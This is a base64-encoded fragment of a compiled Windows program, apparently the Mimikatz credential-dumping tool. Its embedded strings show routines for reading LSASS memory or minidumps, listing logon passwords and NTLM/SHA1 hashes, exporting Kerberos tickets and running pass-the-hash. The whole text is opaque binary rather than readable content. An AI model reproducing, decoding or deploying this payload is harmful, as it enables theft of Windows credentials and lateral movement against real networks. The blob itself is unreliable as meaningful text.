AZQBDAEIAQwAAAEMAaABhAGkAbgBpAG4AZwBNAG8AZABlAAAAAAAAAAAATwBiAGoAZQBjAHQATABlAG4AZwB0AGgAAAAAAAAAAABBAEUAUwAAAEMAaABhAGkAbgBpAG4AZwBNAG8AZABlAEMARgBCAAAATABpAHMAdAAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAE0AYQBuAGEAZwBlAHIAAAAAAAAAAABjAHIAZQBkAG0AYQBuAAAATABpAHMAdAAgAEMAYQBjAGgAZQBkACAATQBhAHMAdABlAHIASwBlAHkAcwAAAAAAZABwAGEAcABpAAAAAAAAAEwAaQBzAHQAIABLAGUAcgBiAGUAcgBvAHMAIAB0AGkAYwBrAGUAdABzAAAAAAAAAHQAaQBjAGsAZQB0AHMAAABQAGEAcwBzAC0AdABoAGUALQBoAGEAcwBoAAAAAAAAAHAAdABoAAAAAAAAAAAAAABTAHcAaQB0AGMAaAAgACgAbwByACAAcgBlAGkAbgBpAHQAKQAgAHQAbwAgAEwAUwBBAFMAUwAgAG0AaQBuAGkAZAB1AG0AcAAgAGMAbwBuAHQAZQB4AHQAAAAAAAAAAABtAGkAbgBpAGQAdQBtAHAAAAAAAAAAAAAAAAAAAAAAAFMAdwBpAHQAYwBoACAAKABvAHIAIAByAGUAaQBuAGkAdAApACAAdABvACAATABTAEEAUwBTACAAcAByAG8AYwBlAHMAcwAgACAAYwBvAG4AdABlAHgAdAAAAAAAAAAAAFMAZQBhAHIAYwBoACAAaQBuACAATABTAEEAUwBTACAAbQBlAG0AbwByAHkAIABzAGUAZwBtAGUAbgB0AHMAIABzAG8AbQBlACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAAAAAAAAAcwBlAGEAcgBjAGgAUABhAHMAcwB3AG8AcgBkAHMAAAAAAAAAAAAAAEwAaQBzAHQAcwAgAGEAbABsACAAYQB2AGEAaQBsAGEAYgBsAGUAIABwAHIAbwB2AGkAZABlAHIAcwAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAAAABsAG8AZwBvAG4AUABhAHMAcwB3AG8AcgBkAHMAAAAAAEwAaQBzAHQAcwAgAFMAUwBQACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAAAAAAHMAcwBwAAAATABpAHMAdABzACAATABpAHYAZQBTAFMAUAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAAAABsAGkAdgBlAHMAcwBwAAAATABpAHMAdABzACAAVABzAFAAawBnACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAdABzAHAAawBnAAAAAAAAAEwAaQBzAHQAcwAgAEsAZQByAGIAZQByAG8AcwAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAATABpAHMAdABzACAAVwBEAGkAZwBlAHMAdAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAAAAB3AGQAaQBnAGUAcwB0AAAATABpAHMAdABzACAATABNACAAJgAgAE4AVABMAE0AIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAABtAHMAdgAAAAAAAAAAAAAAUwBvAG0AZQAgAGMAbwBtAG0AYQBuAGQAcwAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAC4ALgAuAAAAAAAAAFMAZQBrAHUAcgBMAFMAQQAgAG0AbwBkAHUAbABlAAAAcwBlAGsAdQByAGwAcwBhAAAAAAAAAAAAUwB3AGkAdABjAGgAIAB0AG8AIABQAFIATwBDAEUAUwBTAAoAAAAAAFMAdwBpAHQAYwBoACAAdABvACAATQBJAE4ASQBEAFUATQBQAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAG0AaQBuAGkAZAB1AG0AcAAgADsAIAA8AG0AaQBuAGkAZAB1AG0AcABmAGkAbABlAC4AZABtAHAAPgAgAGEAcgBnAHUAbQBlAG4AdAAgAGkAcwAgAG0AaQBzAHMAaQBuAGcACgAAAAAAAAAAAGwAcwBhAHMAcwAuAGUAeABlAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABMAFMAQQBTAFMAIABwAHIAbwBjAGUAcwBzACAAbgBvAHQAIABmAG8AdQBuAGQAIAAoAD8AKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAE0AaQBuAGkAZAB1AG0AcAAgAHAASQBuAGYAbwBzAC0APgBNAGEAagBvAHIAVgBlAHIAcwBpAG8AbgAgACgAJQB1ACkAIAAhAD0AIABNAEkATQBJAEsAQQBUAFoAXwBOAFQAXwBNAEEASgBPAFIAXwBWAEUAUgBTAEkATwBOACAAKAAlAHUAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATQBpAG4AaQBkAHUAbQBwACAAcABJAG4AZgBvAHMALQA+AFAAcgBvAGMAZQBzAHMAbwByAEEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlACAAKAAlAHUAKQAgACEAPQAgAFAAUgBPAEMARQBTAFMATwBSAF8AQQBSAEMASABJAFQARQBDAFQAVQBSAEUAXwBBAE0ARAA2ADQAIAAoACUAdQApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATQBpAG4AaQBkAHUAbQBwACAAdwBpAHQAaABvAHUAdAAgAFMAeQBzAHQAZQBtAEkAbgBmAG8AUwB0AHIAZQBhAG0AIAAoAD8AKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAEsAZQB5ACAAaQBtAHAAbwByAHQACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAEwAbwBnAG8AbgAgAGwAaQBzAHQACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAE0AbwBkAHUAbABlAHMAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4AcwAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATQBlAG0AbwByAHkAIABvAHAAZQBuAGkAbgBnAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAEgAYQBuAGQAbABlACAAbwBmACAAbQBlAG0AbwByAHkAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATABvAGMAYQBsACAATABTAEEAIABsAGkAYgByAGEAcgB5ACAAZgBhAGkAbABlAGQACgAAAAAAAAAAAAkAJQBzACAAOgAJAAAAAAAKAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgAgAEkAZAAgADoAIAAlAHUAIAA7ACAAJQB1ACAAKAAlADAAOAB4ADoAJQAwADgAeAApAAoAUwBlAHMAcwBpAG8AbgAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgACUAcwAgAGYAcgBvAG0AIAAlAHUACgBVAHMAZQByACAATgBhAG0AZQAgACAAIAAgACAAIAAgACAAIAA6ACAAJQB3AFoACgBEAG8AbQBhAGkAbgAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQB3AFoACgBTAEkARAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAAAAAAAAAAAAKAAkAIAAqACAAVQBzAGUAcgBuAGEAbQBlACAAOgAgACUAdwBaAAoACQAgACoAIABEAG8AbQBhAGkAbgAgACAAIAA6ACAAJQB3AFoAAAAAAAoACQAgACoAIABMAE0AIAAgACAAIAAgACAAIAA6ACAAAAAAAAAAAAAKAAkAIAAqACAATgBUAEwATQAgACAAIAAgACAAOgAgAAAAAAAAAAAACgAJACAAKgAgAFMASABBADEAIAAgACAAIAAgADoAIAAAAAAAAAAAAAoACQAgACoAIABSAGEAdwAgAGQAYQB0AGEAIAA6ACAAAAAAAAAAAAAKAAkAIAAqACAAUABJAE4AIABjAG8AZABlACAAOgAgACUAdwBaAAAAJQB3AFoACQAlAHcAWgAJAAAAAAAAAAAACgAJACAAKgAgAFUAcwBlAHIAbgBhAG0AZQAgADoAIAAlAHcAWgAKAAkAIAAqACAARABvAG0AYQBpAG4AIAAgACAAOgAgACUAdwBaAAoACQAgACoAIABQAGEAcwBzAHcAbwByAGQAIAA6ACAAAAAAAEwAVQBJAEQAIABLAE8ACgAAAAAAAAAAAAoACQAgACoAIABSAG8AbwB0AEsAZQB5ACAAIAA6ACAAAAAAAAAAAAAKAAkAIAAqACAARABQAEEAUABJACAAIAAgACAAOgAgAAAAAAAAAAAACgAJACAAKgAgACUAMAA4AHgAIAA6ACAAAAAAAAAAAABDAGEAYwBoAGUAZABVAG4AbABvAGMAawAAAAAAAAAAAEMAYQBjAGgAZQBkAFIAZQBtAG8AdABlAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAAAEMAYQBjAGgAZQBkAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAAAAAAAABSAGUAbQBvAHQAZQBJAG4AdABlAHIAYQBjAHQAaQB2AGUAAAAAAAAATgBlAHcAQwByAGUAZABlAG4AdABpAGEAbABzAAAAAABOAGUAdAB3AG8AcgBrAEMAbABlAGEAcgB0AGUAeAB0AAAAAAAAAAAAVQBuAGwAbwBjAGsAAAAAAFAAcgBvAHgAeQAAAAAAAABTAGUAcgB2AGkAYwBlAAAAQgBhAHQAYwBoAAAAAAAAAE4AZQB0AHcAbwByAGsAAABJAG4AdABlAHIAYQBjAHQAaQB2AGUAAABVAG4AawBuAG8AdwBuACAAIQAAAAAAAABVAG4AZABlAGYAaQBuAGUAZABMAG8AZwBvAG4AVAB5AHAAZQAAAAAACgAJACAAWwAlADAAOAB4AF0AAAAAAAAAZABwAGEAcABpAHMAcgB2AC4AZABsAGwAAAAAAAAAAAAJACAAWwAlADAAOAB4AF0ACgAJACAAKgAgAEcAVQBJAEQAIAA6AAkAAAAAAAAAAAAKAAkAIAAqACAAVABpAG0AZQAgADoACQAAAAAAAAAAAAoACQAgACoAIABLAGUAeQAgADoACQAAAAoACQBLAE8AAAAAAAAAAABrAGUAcgBiAGUAcgBvAHMALgBkAGwAbAAAAAAAAAAAAAAAAAAAAAAACgBBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AIABJAGQAIAA6ACAAJQB1ACAAOwAgACUAdQAgACgAJQAwADgAeAA6ACUAMAA4AHgAKQAKAFMAZQBzAHMAaQBvAG4AIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAlAHMAIABmAHIAbwBtACAAJQB1AAoAVQBzAGUAcgAgAE4AYQBtAGUAIAAgACAAIAAgACAAIAAgACAAOgAgACUAdwBaAAoARABvAG0AYQBpAG4AIAAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgACUAdwBaAAoAAAAAAAAAAAAKAAkAVABpAGMAawBlAHQAcwAgAGcAcgBvAHUAcAAgACUAdQAAAAAACgAJACAAIAAgACoAIABTAGEAdgBlAGQAIAB0AG8AIABmAGkAbABlACAAJQBzACAAIQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AawBlAHIAYgBlAHIAbwBzAF8AZQBuAHUAbQBfAHQAaQBjAGsAZQB0AHMAIAA7ACAAawB1AGwAbABfAG0AXwBmAGkAbABlAF8AdwByAGkAdABlAEQAYQB0AGEAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABbACUAeAA7ACUAeABdAC0AJQAxAHUALQAlAHUALQAlADAAOAB4AC0AJQB3AFoAQAAlAHcAWgAtACUAdwBaAC4AJQBzAAAAAABbACUAeAA7ACUAeABdAC0AJQAxAHUALQAlAHUALQAlADAAOAB4AC4AJQBzAAAAAABsAGkAdgBlAHMAcwBwAC4AZABsAGwAAABDcmVkZW50aWFsS2V5cwAAUHJpbWFyeQAKAAkAIABbACUAMAA4AHgAXQAgACUAWgAAAAAAAAAAAEQAYQB0AGEAIABjAG8AcAB5ACAAQAAlAHAAIAA6ACAAAAAAAAAAAABPAEsAIAAhAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBtAHMAdgBfAGUAbgB1AG0AXwBjAHIAZQBkAF8AYwBhAGwAbABiAGEAYwBrAF8AcAB0AGgAIAA7ACAAawB1AGwAbABfAG0AXwBtAGUAbQBvAHIAeQBfAGMAbwBwAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAG4AdABsAG0AAAAAAAAAAAByAHUAbgAAAE4AVABMAE0ACQA6ACAAAABQAHIAbwBnAHIAYQBtAAkAOgAgACUAcwAKAAAAAAAAACAAIAB8ACAAIABQAEkARAAgACAAJQB1AAoAIAAgAHwAIAAgAFQASQBEACAAIAAlAHUACgAAAAAAIAAgAHwAIAAgAEwAVQBJAEQAIAAlAHUAIAA7ACAAJQB1ACAAKAAlADAAOAB4ADoAJQAwADgAeAApAAoAAAAAACAAIABcAF8AIAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAG0AcwB2AF8AcAB0AGgAIAA7ACAARwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AbQBzAHYAXwBwAHQAaAAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAVABvAGsAZQBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBtAHMAdgBfAHAAdABoACAAOwAgAEMAcgBlAGEAdABlAFAAcgBvAGMAZQBzAHMAVwBpAHQAaABMAG8AZwBvAG4AVwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBtAHMAdgBfAHAAdABoACAAOwAgAG4AdABsAG0AIABoAGEAcwBoACAAbABlAG4AZwB0AGgAIABtAHUAcwB0ACAAYgBlACAAMwAyACAAKAAxADYAIABiAHkAdABlAHMAKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBtAHMAdgBfAHAAdABoACAAOwAgAE0AaQBzAHMAaQBuAGcAIABhAHIAZwB1AG0AZQBuAHQAIAA6ACAAbgB0AGwAbQAKAAAAAAAAAAAAJQBzAAkAOgAgACUAcwAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBtAHMAdgBfAHAAdABoAF8AbQBhAGsAZQBmAGEAawBlAHMAdAByAGkAbgBnACAAOwAgAE0AaQBzAHMAaQBuAGcAIABhAHIAZwB1AG0AZQBuAHQAIAA6ACAAJQBzAAoAAAAAAAAAbgAuAGUALgAgACgASwBJAFcASQBfAE0AUwBWADEAXwAwAF8AUABSAEkATQBBAFIAWQBfAEMAUgBFAEQARQBOAFQASQBBAEwAUwAgAEsATwApAAAAAAAAAAAAAAAAAAAAbgAuAGUALgAgACgASwBJAFcASQBfAE0AUwBWADEAXwAwAF8AQwBSAEUARABFAE4AVABJAEEATABTACAASwBPACkAAAAAAAAAbQBzAHYAMQBfADAALgBkAGwAbAAAAAAAdABzAHAAawBnAC4AZABsAGwAAAAAAAAAdwBkAGkAZwBlAHMAdAAuAGQAbABsAAAAAQkDAAkBpgACMAAAAQ4BAA5CAAABFAIAFFIQcAEXAQAXYgAACRUIABXECgAVdAkAFWQIABVSEdCeegEAAQAAACFFAQB3RgEAPJ0BAHdGAQABDAIADAERAAEYCAAYZAgAGFQHABg0BgAYMhRwGRoGAAuSB8AFcARgA1ACMKBCAQBAAAAAGRcEAAhyBHADYAIwoEIBADgAAAAZKQsAFzRfABcBVAAQ8A7gDNAKwAhwB2AGUAAAoEIBAJgCAAAZKQsAFzSfABcBlAAQ8A7gDNAKwAhwB2AGUAAAoEIBAJAEAAABFAgAFGQQABRUDwAUNA4AFLIQcAEPBgAPZAcADzQGAA8yC3AZIwoAFDQUABSyEPAO4AzQCsAIcAdgBlCgQgEAUAAAABkrCwAZNIEAGQF2ABLwEOAO0AzACnAJYAhQAACgQgEAoAMAAAEGAgAGMgJQEQoEAAo0BgAKMgZwnnoBAAEAAAADegEAF3oBAFidAQAAAAAAAQQBAATCAAAJBAEABEIAAJ56AQABAAAAj3sBAMJ7AQBxnQEAwnsBAAkEAQAEIgAAnnoBAAEAAADpewEAH3wBAAEAAAAffAEAAQoEAAo0CAAKMgZwARQIABRyEPAO4AzQCsAIcAdgBjAZIQgAElQJABI0CAASMg7QDHALYKBCAQAQAAAAGSkLABc0HgAXARQAEPAO4AzQCsAIcAdgBlAAAKBCAQCQAAAAGRsEAAw0EAAMsghwoEIBAFgAAAABBgIABlICMAEXCAAXZAsAF1QKABc0CQAXUhNwAQ8GAA9kCQAPNAgADzILcBkhCAASVA0AEjQMABJSDsAMcAtgoEIBACgAAAABBgIABpICMAEcCwAcdCkAHGQoABxUJwAcNCYAHAEkABXAAAABDQUADQEYAAZwBWAEMAAAAQYCAAYyAjABHAwAHGQMABxUCwAcNAoAHDIY8BbgFNASwBBwARgKABhkDQAYVAwAGDQLABhSFNASwBBwAQQBAASCAAABFAgAFGQJABRUCAAUNAcAFDIQcAEYCAAYZA4AGFQNABg0DAAYkhRwAR0MAB10DQAdZAwAHVQLAB00CgAdUhngF9AVwAEgDAAgZA8AIFQNACA0DAAgUhzwGuAY0BbAFHABGQoAGXQNABlkDAAZVAsAGTQKABlyFcABHQwAHXQPAB1kDgAdVA0AHTQMAB1yGeAX0BXAARkKABl0EQAZZBAAGVQPABk0DgAZshXAAREGABE0DQARcg1wDGALUAEcCwAcxB8AHHQeABxkHQAcNBwAHAEaABXQAAABGQoAGXQJABlkCAAZVAcAGTQGABkyFcABFwEAF0IAAAEYAgAYMhQwAQ8GAA9kBwAPVAYADzILcAESCAASVA8AEjQMABJyDsAMcAtgARQIABRkDgAUVA0AFDQMABSSEHABFAgAFGQMABRUCwAUNAoAFHIQcAEPBgAPZAkADzQIAA9SC3ABCAIACHIEMAELAgAL8gQwAQoEAAo0CAAKUgZwARIIABJUCwASNAoAElIOwAxwC2ABBgIABtICMAEbCgAbZBcAG1QVABs0FAAb8hTQEsAQcAEbCgAbZBYAG1QVABs0FAAb8hTQEsAQcAEbCwAbZBoAG1QZABs0GAAbARQAFNASwBBwAAABGAoAGGQUABhUEwAYNBIAGNIU0BLAEHABHAwAHGQQABxUDwAcNA4AHHIY8BbgFNASwBBwARwMABxkEgAcVBEAHDQQABySGPAW4BTQEsAQcAEYCgAYZBMAGFQRABg0EAAYshTQEsAQcAEOBgAONAsADlIKcAlgCFABFwsAFzQcABcBFAAQ8A7gDNAKwAhwB2AGUAAAARYKABZUEwAWNBIAFrIS8BDQDsAMcAtgAQ8GAA9kCwAPNAoAD3ILcAEdCwAdNC8AHQEkABbwFOAS0BDADnANYAxQAAABGwkAG4IX8BXgE9ARwA9wDmANUAwwAAABDAQADDQQAAzSCHABDAYADDQNAAxyCHAHYAZQARYKABY0DgAWUhLwEOAO0AzACnAJYAhQARAGABBkCwAQNAoAEHIMcAEQBgAQZA0AEDQMABCSDHABIQoAIWQKACFUCQAhNAgAITId0BvAGXABCgQACjQGAAoyBnABDwYAD2QPAA80DgAPsgtwAQ4CAA4yCjABEwgAE1QRABM0DgATkg/ADXAMYAERBgARNBQAEfIKcAlgCFABFwsAFzQeABcBFgAQ8A7gDNAKwAhwB2AGUAAAAQQBAASiAAABFAQAFDQJABRSEHABGwsAG2QsABtUKwAbNCoAGwEmABTgEtAQcAAAARoLABpUIQAaNCAAGgEaABPwEdAPwA1wDGAAAAEbCQAbVB8AGzQeABsBGgAU0BLAEHAAAAEaCwAaVB0AGjQcABoBFgAT4BHQD8ANcAxgAAABEggAEjQQABKSDtAMwApwCWAIUAEMBAAMNAgADFIIcAEQBgAQZBEAEDQQABDSDHABEgcAEmQVABI0FAASARIAC3AAAAEcCwAcNE8AHAFEABXwE+AR0A/ADXAMYAtQAAABCgIACgFJAAEUCAAUZA8AFFQOABQ0DQAUkhBwAR0MAB10CwAdZAoAHVQJAB00CAAdMhngF9AVwAEgDAAgZA8AIFQOACA0DAAgUhzwGuAY0BbAFHABGAoAGGQKABhUCQAYNAgAGDIU0BLAEHABCAIACJIEMAEaCQAaZBsAGlQaABo0GAAaARYAE3AAAAEXCQAXZBoAF1QZABc0GAAXARYAEHAAAAETCAATVA8AEzQOABOSD8ANcAxgARsKABtkFwAbVBYAGzQVABvyFNASwBBwARQIABRkDQAUVAwAFDQLABRyEHABFgoAFjQWABbSEvAQ4A7QDMAKcAlgCFABFgkAFlQXABY0FgAWARIAD8ANcAxgAAABGQsAGTQoABkBHgAS8BDgDtAMwApwCWAIUAAAAR8NAB9kKgAfVCkAHzQoAB8BIgAY8BbgFNASwBBwAAABIQsAITQmACEBHgAa8BjgFtAUwBJwEWAQUAAAARgKABhkEgAYVBEAGDQQABiyFNASwBBwARMGABNUCgATNAkAE1IPcAEVBgAVNAwAFVIRwA9wDmABCwYAC1IH0AVwBGADUAIwARIIABI0FAAS0g7QDMAKcAlgCFABDQUADTQoAA0BJgAGcAAAAQwEAAw0DAAMkghwARMHABNkFwATNBYAEwEUAAxwAAABGwsAG2QZABtUFwAbNBYAGwESABTQEsAQcAAAASANACB0QQAgZEAAIFQ/ACA0PgAgAToAGeAX0BXAAAABGgYAGjQTABqyFnAVYBRQAQQBAATiAAABEwcAE2QVABM0FAATARIADHAAAAEUCAAUZAgAFFQHABQ0BgAUMhBwARAGABBkEgAQNBEAENIMcAEcDAAcZBEAHFQQABw0DwAcchjwFuAU0BLAEHABFAgAFGQTABRUEgAUNBEAFNIQcAEMBAAMNA4ADLIIcAEYCgAYZBUAGFQUABg0EwAY0hTQEsAQcAEUCAAUZAoAFFQJABQ0CAAUUhBwARYKABZUFQAWNBQAFtIS4BDQDsAMcAtgAQ8IAA9yC+AJ0AfABXAEYANQAjABDAQADDQRAAzSCHABGAoAGGQRABhUEAAYNA8AGJIU0BLAEHABFwgAF2QWABc0FQAX8hDQDsAMcAEUCAAUZBIAFFQRABQ0EAAU0hBwARIHABJkKwASNCoAEgEoAAtwAAABFwkAF2QeABdUHQAXNBwAFwEaABBwAAABFwkAF2QoABdUJwAXNCYAFwEkABBwAAABFwgAF2QUABdUEwAXNBIAF/IQcAETBwATZBsAEzQaABMBGAAMcAAAASANACB0IQAgZCAAIFQfACA0HgAgARoAGeAX0BXAAAABFQkAFTQkABUBHgAO0AzACnAJYAhQAAABCwMACwESAARwAAABGgsAGlQmABo0JAAaAR4AE+AR0A/ADXAMYAAAAQQBAARiAAABFQkAFTQ2ABUBMAAO4AzQCnAJYAhQAAABEwcAE2QdABM0HAATARoADHAAAAENBgANNAoADVIJwAdwBlABGgsAGmRPABo0TgAaAUgAE/AR4A/QDcALcAAAARkKABk0GAAZ8hLwEOAO0AzACnAJYAhQARkLABk0IwAZARoAEvAQ4A7QDMAKcAlgCFAAAAEhCgAhNBgAIfIa8BjgFtAUwBJwEWAQUAEbCwAbZCUAG1QkABs0IgAbAR4AFNASwBBwAAABFgkAFlQjABY0IgAWAR4AD8ANcAxgAAABHAwAHGQXABxUFgAcNBUAHNIY8BbgFNASwBBwARwKABx0FQAcZBQAHFQTABw0EgAc8hXAAQgBAAhCAAABBwEAB4IAAAEKBAAKNAcACjIGcAEEAQAEQgAA2JYCAAAAAAAAAAAA9KICAACgAQC4mAIAAAAAAAAAAAAQpAIA4KEBANibAgAAAAAAAAAAAGSkAgAApQEAaJsCAAAAAAAAAAAAqKQCAJCkAQDgmgIAAAAAAAAAAADmpQIACKQBAIibAgAAAAAAAAAAAHymAgCwpAEAWJsCAAAAAAAAAAAAnqYCAICkAQC4mwIAAAAAAAAAAADMpgIA4KQBAKCdAgAAAAAAAAAAAESoAgDIpgEAEJkCAAAAAAAAAAAAqqsCADiiAQAInAIAAAAAAAAAAABmrAIAMKUBAAAAAAAAAAAAAAAAAAAAAAAAAAAAYJ4CAAAAAAB8ngIAAAAAAIyeAgAAAAAAmJ4CAAAAAACungIAAAAAAMieAgAAAAAA4J4CAAAAAAD0ngIAAAAAAAifAgAAAAAAGJ8CAAAAAAAonwIAAAAAADifAgAAAAAARp8CAAAAAABcnwIAAAAAAGyfAgAAAAAAfp8CAAAAAACOnwIAAAAAAJ6fAgAAAAAAtp8CAAAAAADInwIAAAAAANifAgAAAAAA8p8CAAAAAAAGoAIAAAAAABygAgAAAAAAMKACAAAAAABKoAIAAAAAAFygAgAAAAAAdKACAAAAAACIoAIAAAAAAJ6gAgAAAAAAtKACAAAAAADIoAIAAAAAANqgAgAAAAAA7KACAAAAAAD8oAIAAAAAABqhAgAAAAAALKECAAAAAAA+oQIAAAAAAFqhAgAAAAAAdqECAAAAAACUoQIAAAAAALChAgAAAAAAuqECAAAAAADOoQIAAAAAAOKhAgAAAAAA9qECAAAAAAAKogIAAAAAAByiAgAAAAAAMKICAAAAAABCogIAAAAAAFKiAgAAAAAAZqICAAAAAAB2ogIAAAAAAIaiAgAAAAAAmKICAAAAAACqogIAAAAAAL6iAgAAAAAA1qICAAAAAADiogIAAAAAAAAAAAAAAAAAAqMCAAAAAAAmowIAAAAAADyjAgAAAAAATKMCAAAAAABqowIAAAAAAI6jAgAAAAAAoKMCAAAAAADEowIAAAAAAOKjAgAAAAAA+KMCAAAAAAAAAAAAAAAAADCvAgAAAAAAGq8CAAAAAAAKrwIAAAAAAPCuAgAAAAAA0q4CAAAAAAC2rgIAAAAAAKKuAgAAAAAAjq4CAAAAAAB0rgIAAAAAAGCuAgAAAAAASq4CAAAAAACWqwIAAAAAAICrAgAAAAAAbKsCAAAAAABOqwIAAAAAADCrAgAAAAAAIKsCAAAAAAAEqwIAAAAAAPKqAgAAAAAA4qoCAAAAAADUqgIAAAAAAMSqAgAAAAAArKoCAAAAAACYqgIAAAAAAIKqAgAAAAAAaqoCAAAAAABQqgIAAAAAAD6qAgAAAAAALKoCAAAAAAAaqgIAAAAAAASqAgAAAAAA8qkCAAAAAADiqQIAAAAAAMypAgAAAAAAuKkCAAAAAACkqQIAAAAAAJKpAgAAAAAAgqkCAAAAAABwqQIAAAAAAF6pAgAAAAAATqkCAAAAAAA8qQIAAAAAACypAgAAAAAAHqkCAAAAAAAKqQIAAAAAAPyoAgAAAAAA5KgCAAAAAADUqAIAAAAAAMCoAgAAAAAATqgCAAAAAABgqAIAAAAAAGioAgAAAAAAgKgCAAAAAACOqAIAAAAAAJqoAgAAAAAApqgCAAAAAACyqAIAAAAAAAAAAAAAAAAA4KQCAAAAAADwpAIAAAAAAAylAgAAAAAAGqUCAAAAAAA0pQIAAAAAAEylAgAAAAAAzqUCAAAAAACwpQIAAAAAAKKlAgAAAAAAtKQCAAAAAADOpAIAAAAAAFylAgAAAAAAaqUCAAAAAACMpQIAAAAAAAAAAAAAAAAAiKYCAAAAAAAAAAAAAAAAAHKkAgAAAAAAhKQCAAAAAACYpAIAAAAAAAAAAAAAAAAARqYCAAAAAABcpgIAAAAAAPKlAgAAAAAAFKYCAAAAAAAqpgIAAAAAAAAAAAAAAAAAtqYCAAAAAADCpgIAAAAAAKqmAgAAAAAAAAAAAAAAAAAupAIAAAAAAEKkAgAAAAAATqQCAAAAAABapAIAAAAAABykAgAAAAAAAAAAAAAAAAAsrgIAAAAAACCuAgAAAAAAGK4CAAAAAAAMrgIAAAAAADauAgAAAAAAQK4CAAAAAAD+rQIAAAAAAPStAgAAAAAA4K0CAAAAAADUrQIAAAAAAMitAgAAAAAAvq0CAAAAAAC0rQIAAAAAAPirAgAAAAAAAqwCAAAAAAAOrAIAAAAAABisAgAAAAAAIqwCAAAAAAAqrAIAAAAAADSsAgAAAAAAPKwCAAAAAABGrAIAAAAAAFCsAgAAAAAAqq0CAAAAAAByrAIAAAAAAHysAgAAAAAAhqwCAAAAAACerAIAAAAAALCsAgAAAAAAvqwCAAAAAADGrAIAAAAAANCsAgAAAAAA2KwCAAAAAADkrAIAAAAAAPKsAgAAAAAABq0CAAAAAAASrQIAAAAAABytAgAAAAAALq0CAAAAAAA4rQIAAAAAAEKtAgAAAAAATK0CAAAAAABcrQIAAAAAAGqtAgAAAAAAdq0CAAAAAACErQIAAAAAAI6tAgAAAAAAlq0CAAAAAACirQIAAAAAAFysAgAAAAAAAAAAA